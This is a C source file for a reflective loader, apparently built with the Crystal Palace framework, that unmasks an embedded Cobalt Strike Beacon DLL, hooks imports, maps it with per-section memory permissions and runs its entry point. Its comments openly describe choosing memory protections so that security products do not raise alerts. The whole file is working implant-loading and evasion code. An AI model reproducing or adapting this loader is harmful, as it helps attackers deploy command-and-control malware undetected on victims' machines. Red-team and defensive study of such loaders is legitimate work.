#include <windows.h>
#include "loader.h"
#include "tcg.h"
#include "memory.h"
#include <intrin.h>

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc   ( LPVOID, SIZE_T, DWORD, DWORD );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree    ( LPVOID, SIZE_T, DWORD );

char _PICO_ [ 0 ] __attribute__ ( ( section ( "pico" ) ) );
char _MASK_ [ 0 ] __attribute__ ( ( section ( "mask" ) ) );
char _DLL_  [ 0 ] __attribute__ ( ( section ( "dll" ) ) );

int __tag_setup_hooks  ( );
int __tag_setup_memory ( );

typedef void ( * SETUP_HOOKS ) ( IMPORTFUNCS * funcs );
typedef void ( * SETUP_MEMORY ) ( MEMORY_LAYOUT * layout );

void fix_section_permissions ( DLLDATA * dll, char * src, char * dst, MEMORY_REGION * region )
{
    DWORD                  section_count = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER * section_hdr   = NULL;
    void                 * section_dst   = NULL;
    DWORD                  section_size  = 0;
    DWORD                  new_protect   = 0;
    DWORD                  old_protect   = 0;

    section_hdr  = ( IMAGE_SECTION_HEADER * ) PTR_OFFSET ( dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader );

    for ( int i = 0; i < section_count; i++ )
    {
        section_dst  = dst + section_hdr->VirtualAddress;
        section_size = section_hdr->SizeOfRawData;

        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) {
            new_protect = PAGE_WRITECOPY;
        }
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) {
            new_protect = PAGE_READONLY;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) ) {
            new_protect = PAGE_READWRITE;
        }
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
            new_protect = PAGE_EXECUTE;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) ) {
            new_protect = PAGE_EXECUTE_WRITECOPY;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) ) {
            new_protect = PAGE_EXECUTE_READ;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) {
            new_protect = PAGE_EXECUTE_READWRITE;
        }

        /* set new permission */
        KERNEL32$VirtualProtect ( section_dst, section_size, new_protect, &old_protect );

        /* track memory */
        region->Sections[ i ].BaseAddress     = section_dst;
        region->Sections[ i ].Size            = section_size;
        region->Sections[ i ].CurrentProtect  = new_protect;
        region->Sections[ i ].PreviousProtect = new_protect;

        /* advance to section */
        section_hdr++;
    }
}

void go ( void * loader_arguments )
{
    /*
    Two functions provided via tcg.h - PicoLoad and ProcessImports - require access to the 
    LoadLibraryA and GetProcAddress APIs to function.  These are needed to ensure any modules
    that a PICO or DLL are dependant on are properly imported and resolved.
    This is potentially quite confusing because there are no DFR references for these two APIs.
    This is purely a 'convenience' thing provided by Crystal Palace, as it will implicitly assume
    that LoadLibraryA and GetProcAddress mean KERNEL32$LoadLibraryA and KERNEL32$GetProcAddress
    respectively.
    */

    IMPORTFUNCS funcs;
    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;

    /* load the pico */
    char * pico_src = GETRESOURCE ( _PICO_ );

    /* allocate memory for it */
    /*
    The basic loader allocates a single RWX memory region for Beacon, which is not good OPSEC.
    Lots of security products will alert on RWX memory allocations, unless they're in expected 
    processes like PowerShell.
    Instead, we would like to allocate RW memory and then change the permissions based on the 
    characteristics of each DLL section.
    Load the DLL as normal but call fix_section_permissions after the DLL's imports have been 
    processed.
    */
    PICO * pico_dst = ( PICO * ) KERNEL32$VirtualAlloc ( NULL, sizeof ( PICO ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    /* load it into memory */
    PicoLoad ( &funcs, pico_src, pico_dst->code, pico_dst->data );

    /* make code section RX */
    DWORD old_protect;
    KERNEL32$VirtualProtect ( pico_dst->code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );

    /* begin tracking memory allocations */
    MEMORY_LAYOUT memory    = { 0 };

    memory.Pico.BaseAddress = ( PVOID ) ( pico_dst );
    memory.Pico.Size        = sizeof ( PICO );
    
    /* section 0 is data section */
    memory.Pico.Sections[ 0 ].BaseAddress     = ( PVOID ) ( pico_dst->data );
    memory.Pico.Sections[ 0 ].Size            = PicoDataSize ( pico_src );
    memory.Pico.Sections[ 0 ].CurrentProtect  = PAGE_READWRITE;
    memory.Pico.Sections[ 0 ].PreviousProtect = PAGE_READWRITE;
    
    /* section 1 is code section */
    memory.Pico.Sections[ 1 ].BaseAddress     = ( PVOID ) ( pico_dst->code );
    memory.Pico.Sections[ 1 ].Size            = PicoCodeSize ( pico_src );
    memory.Pico.Sections[ 1 ].CurrentProtect  = PAGE_EXECUTE_READ;
    memory.Pico.Sections[ 1 ].PreviousProtect = PAGE_EXECUTE_READ;

    /* call setup_hooks to overwrite funcs.GetProcAddress */
    ( ( SETUP_HOOKS ) PicoGetExport ( pico_src, pico_dst->code, __tag_setup_hooks ( ) ) ) ( &funcs );

    /* now load the dll (it's masked) */
    RESOURCE * masked_dll = ( RESOURCE * ) GETRESOURCE ( _DLL_ );
    RESOURCE * mask_key   = ( RESOURCE * ) GETRESOURCE ( _MASK_ );

    /* load dll into memory and unmask it */
    char * dll_src = KERNEL32$VirtualAlloc ( NULL, masked_dll->len, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    for ( int i = 0; i < masked_dll->len; i++ ) {
        dll_src [ i ] = masked_dll->value [ i ] ^ mask_key->value [ i % mask_key->len ];
    }

    DLLDATA dll_data;
    ParseDLL ( dll_src, &dll_data );

    char * dll_dst = KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &dll_data ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    LoadDLL ( &dll_data, dll_src, dll_dst );

    /* track dll's memory */
    memory.Dll.BaseAddress = ( PVOID ) ( dll_dst );
    memory.Dll.Size        = SizeOfDLL ( &dll_data );

    ProcessImports ( &funcs, &dll_data, dll_dst );
    fix_section_permissions ( &dll_data, dll_src, dll_dst, &memory.Dll );

    /* call setup_memory to give PICO the memory info */
    ( ( SETUP_MEMORY ) PicoGetExport ( pico_src, pico_dst->code, __tag_setup_memory ( ) ) ) ( &memory );
    
    // __debugbreak();

    /* now run the DLL */
    DLLMAIN_FUNC entry_point = EntryPoint ( &dll_data, dll_dst );

    /* free the unmasked copy */
    KERNEL32$VirtualFree ( dll_src, 0, MEM_RELEASE );

    /*
    Beacon (and its postex DLLs) have a calling convention where their entry point needs to be
    called multiple times so they can bootstrap themselves prior to execution.
    You call it the first time using a fdwReason value of 1 (DLL_PROCESS_ATTACH), while passing 
    the DLL's own base address; then call it a second time using a fdwReason of 4, while passing
    the base address of the loader.
    This last one is needed so that if stage.cleanup (or post-ex.cleanup) are set to true, 
    the DLL can free the loader from memory.    
    */
    entry_point ( ( HINSTANCE ) dll_dst, DLL_PROCESS_ATTACH, NULL );
    entry_point ( ( HINSTANCE ) ( char * ) go, 0x4, loader_arguments );
}
